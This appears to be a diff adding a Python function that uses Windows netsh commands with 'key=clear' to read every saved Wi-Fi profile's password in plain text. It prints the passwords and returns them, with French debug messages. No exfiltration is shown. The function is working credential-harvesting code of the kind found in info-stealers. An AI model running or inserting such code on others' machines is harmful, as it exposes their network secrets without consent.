@@ -1,0 +1,28 @@
+def extract_wifi_info():
+    try:
+        profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], text=True)
+        print("Profils détectés (brut) :", profiles)
+        wifi_data = {}
+        for line in profiles.split('\n'):
+            if "All User Profile" in line:
+                profile_name = line.split(':')[1].strip()
+                print("Profil trouvé :", profile_name)
+                try:
+                    details_cmd = ['netsh', 'wlan', 'show', 'profile', 'name="'+profile_name+'"', 'key=clear']
+                    details = subprocess.check_output(details_cmd, text=True)
+                    print("Détails bruts :", details)
+                    for detail in details.split('\n'):  # Ligne 25 environ
+                        print("Ligne analysée :", detail)
+                        if "Key Content" in detail:
+                            key_value = detail.split(':')[1].strip()
+                            print(f"Clé trouvée pour {profile_name} : {key_value}")
+                            wifi_data[profile_name] = key_value
+                except subprocess.CalledProcessError as e:
+                    print(f"Erreur subprocess pour {profile_name} : {e}")
+                except Exception as e:
+                    print(f"Erreur inattendue pour {profile_name} : {e}")
+        print("Données WiFi finales :", wifi_data)
+        return wifi_data
+    except Exception as e:
+        print("Erreur globale :", str(e))
+        return {"error": str(e)}
